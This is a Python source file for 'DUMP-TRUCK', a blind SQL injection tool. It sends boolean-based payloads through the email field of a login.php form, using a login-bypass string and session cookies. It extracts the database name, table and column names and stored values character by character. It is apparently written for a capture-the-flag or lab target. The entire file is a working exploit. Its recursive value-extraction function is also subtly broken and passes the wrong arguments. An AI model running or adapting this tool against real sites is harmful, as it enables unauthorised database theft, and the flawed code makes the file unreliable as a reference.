import logging
import os
import time
from enum import Enum
from threading import Thread

import requests
from beautifultable import BeautifulTable
from dotenv import load_dotenv

load_dotenv()

from halo import Halo
from pyfiglet import figlet_format
from rich import print
from yachalk import chalk

# Configuration
DOMAIN = os.environ.get("DOMAIN")
URL = f"http://{DOMAIN}:1241"
TARGET = f"{URL}/login.php"  # Request endpoint/target

# Constants
MIN_SIZE = 1
ONE_INDEX = 1  # for MYSQL
ZERO_INDEX = 0
MIN_CHARACTER = chr(ord("0"))
SQLI_LOGIN_BYPASS = "1' OR 1=1"
CAESAR_CIPHER_OFFSET = 1
FAILURE_SIGNAL = "red"
EMPTY_STRING = ""

# Live progress updates
status = ""
http_requests_count = 0

session = requests.Session()
logging.basicConfig(level=logging.INFO)


def increment_requests_count():
    global http_requests_count
    http_requests_count += 1


class InjectionType(Enum):
    DB_LENGTH = 1
    TABLES_COUNT = 2
    TABLE_LENGTH = 3
    COLUMNS_COUNT = 5
    COLUMN_LENGTH = 6
    VALUE_LENGTH = 7


class DumpTruck:
    def __init__(self, name, tables, columns, values):
        self.name = name
        self.tables = tables
        self.columns = columns
        self.values = values

    def dump(self):
        print(
            {
                "database": {
                    "dbname": self.name,
                    "tables": self.tables,
                    "table_columns": self.columns,
                    "values": self.values,
                },
                "HTTP requests": http_requests_count,
            },
        )


class DumpTruckWorker(Thread):
    def __init__(self, value=0):
        super(DumpTruckWorker, self).__init__()

        self.value = value

    def run(self):
        self.printIntro()

        database = get_database()
        database.dump()

    def printIntro(self):
        print(figlet_format("DUMP-TRUCK", font="standard"))

        table = BeautifulTable()
        table.set_style(BeautifulTable.STYLE_MYSQL)

        table.rows.append(["", "Blind SQL Injection Configuration"])
        table.rows.append(["Cookies", session.cookies.get_dict()])
        table.rows.append(["Headers", session.headers])
        table.rows.append(["Target", TARGET])

        print(table)


class ProgressThread(Thread):
    global http_requests_count

    def __init__(self, worker):
        super(ProgressThread, self).__init__()

        global status
        status = "Dumping..."
        self.spinner = Halo(text=status, color="cyan", spinner="arrow3")
        self.worker = worker

    def run(self):
        while True:
            if not self.worker.is_alive():
                self.spinner.stop()
                print("\nDatabase dump finished")
                return True

            time.sleep(1)

            # dbn = f"({database_name})" if len(database_name) > 0 else ""
            global status
            self.spinner.start(
                f"{chalk.cyan.bold(status)} | HTTP requests sent: {chalk.green_bright(http_requests_count)}"
            )


def name_geq_mid(
    sqli,
    pos,
    mid,
    table=EMPTY_STRING,
    table_index=ZERO_INDEX,
    column=EMPTY_STRING,
    column_index=ZERO_INDEX,
):
    match sqli:
        case InjectionType.DB_LENGTH:
            payload = (
                f"{SQLI_LOGIN_BYPASS} AND (SELECT ASCII(SUBSTRING(database(), {pos}, 1)))>={mid} # "
            )
        case InjectionType.TABLE_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {table_index},1), {pos}, 1)))>={mid} # "
        case InjectionType.COLUMN_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT {column_index},1), {pos}, 1)))>={mid} # "
        case InjectionType.VALUE_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 0,1), {pos}, 1)))>={mid} # "

    data = {
        "email": payload,
        "password": "password",
    }

    r = session.post(TARGET, data=data)
    increment_requests_count()

    return FAILURE_SIGNAL not in r.text


def get_character(
    sqli,
    pos,
    table=EMPTY_STRING,
    table_index=ZERO_INDEX,
    column=EMPTY_STRING,
    column_index=ZERO_INDEX,
):
    lo, hi = 23, 127

    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if name_geq_mid(sqli, pos, mid, table, table_index, column, column_index):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo - CAESAR_CIPHER_OFFSET)


def get_size(
    sqli,
    table="",
    table_index=ZERO_INDEX,
    column="",
    column_index=ZERO_INDEX,
    curr=MIN_SIZE,
):
    match sqli:
        case InjectionType.DB_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT LENGTH(database()))={curr} # "
        case InjectionType.TABLES_COUNT:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={curr} # "
        case InjectionType.TABLE_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {table_index},1)={curr} # "
        case InjectionType.COLUMNS_COUNT:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}')={curr} # "
        case InjectionType.COLUMN_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT {column_index},1)={curr} # "
        case InjectionType.VALUE_LENGTH:
            payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT LENGTH({column}) FROM {table} LIMIT 0,1)={curr} # "

    data = {"email": payload, "password": "password"}
    r = session.post(TARGET, data=data)
    increment_requests_count()

    if FAILURE_SIGNAL in r.text:
        return get_size(sqli, table, table_index, column, column_index, curr + 1)
    else:
        return curr


def get_value(
    length,
    table,
    column,
    current_value=EMPTY_STRING,
    current_character=MIN_CHARACTER,
):
    payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT {column} FROM {table} LIMIT 1) LIKE '{current_value+current_character}%' # "

    if len(current_value) < length:
        data = {"email": payload, "password": "password"}
        r = session.post(TARGET, data=data)
        increment_requests_count()

        if FAILURE_SIGNAL in r.text:
            return get_value(
                length,
                table,
                column,
                current_value,
                chr(ord(current_character) + 1),
            )
        else:
            return get_value(
                length,
                table,
                column,
                current_value + current_character,
                current_character,
            )
    else:
        return current_value


def update_status(new_status):
    global status
    status = new_status


def blind_db_name():
    update_status("Dumping database name...")
    db_name_length = get_size(sqli=InjectionType.DB_LENGTH)
    db_name = ""

    for i in range(0, db_name_length):
        db_name += get_character(sqli=InjectionType.DB_LENGTH, pos=i + ONE_INDEX)

    update_status(f"Dumping tables in '{db_name}'...")
    return db_name


def blind_tables():
    tables_count = get_size(sqli=InjectionType.TABLES_COUNT)
    tables = []

    for i in range(tables_count):
        table_name_length = get_size(sqli=InjectionType.TABLE_LENGTH, table_index=i)
        table_name = ""

        # Table names
        for j in range(table_name_length):
            table_name += get_character(
                sqli=InjectionType.TABLE_LENGTH, pos=j + ONE_INDEX, table_index=i
            )
        tables.append(table_name)

    return tables


def blind_table_columns(tables):
    table_columns = []

    for table in tables:
        column_count = get_size(sqli=InjectionType.COLUMNS_COUNT, table=table)
        columns_for_t = []

        for k in range(column_count):
            column_length = get_size(
                sqli=InjectionType.COLUMN_LENGTH,
                table=table,
                column_index=k,
            )
            column = ""

            # Get column names
            for l in range(column_length):
                column += get_character(
                    sqli=InjectionType.COLUMN_LENGTH,
                    pos=l + ONE_INDEX,
                    table=table,
                    column_index=k,
                )
            columns_for_t.append(column)
        table_columns.append({"table": table, "columns": columns_for_t})

    return table_columns


def blind_values(table_columns):
    values = []

    for item in table_columns:
        column_values = []

        # Get 1st value in each column
        for column in item["columns"]:
            value_length = get_size(
                sqli=InjectionType.VALUE_LENGTH,
                table=item["table"],
                column=column,
            )
            value = get_value_LIKE(item["table"], column, value_length)
            column_values.append({column: value})
        values.append(column_values)

    return values


def get_database():
    db_name = blind_db_name()
    tables = blind_tables()
    table_columns = blind_table_columns(tables)
    values = blind_values(table_columns)

    return DumpTruck(db_name, tables, table_columns, values)


def set_session_cookies(cookies):
    for cookie in cookies:
        session.cookies.set(name=cookie["name"], value=cookie["value"], domain=cookie["domain"])


def get_value_LIKE(table, column, value_length=MIN_SIZE, curr_char=0, curr_val=EMPTY_STRING):
    alphanumerics = [
        "A",
        "a",
        "B",
        "b",
        "C",
        "c",
        "D",
        "d",
        "E",
        "e",
        "F",
        "f",
        "G",
        "g",
        "H",
        "h",
        "I",
        "i",
        "J",
        "j",
        "K",
        "k",
        "L",
        "l",
        "M",
        "m",
        "N",
        "n",
        "O",
        "o",
        "P",
        "p",
        "Q",
        "q",
        "R",
        "r",
        "S",
        "s",
        "T",
        "t",
        "U",
        "u",
        "V",
        "v",
        "W",
        "w",
        "X",
        "x",
        "Y",
        "y",
        "Z",
        "z",
        "0",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "-",
        "{",
        "}",
        "_",
        ":",
        "(",
        ")",
        "[",
        "]",
    ]

    payload = f"{SQLI_LOGIN_BYPASS} AND (SELECT {column} FROM {table} LIMIT 1) LIKE '{curr_val}{alphanumerics[curr_char]}%' # "
    data = {"email": payload, "password": "password"}

    r = session.post(TARGET, data=data)

    print(curr_val, ", checking next char:", alphanumerics[curr_char])
    print(FAILURE_SIGNAL not in r.text)

    if len(curr_val) != value_length:
        if FAILURE_SIGNAL in r.text:
            return get_value_LIKE(curr_char + 1, curr_val)
        else:
            return get_value_LIKE(0, curr_val + alphanumerics[curr_char])
    else:
        return curr_val


def main():
    cookies = [
        {
            "name": os.environ.get("COOKIE_NAME"),
            "value": os.environ.get("COOKIE_VALUE"),
            "domain": DOMAIN,
        }
    ]
    set_session_cookies(cookies)

    worker = DumpTruckWorker()
    progress = ProgressThread(worker)

    worker.start()
    progress.start()


if __name__ == "__main__":
    main()
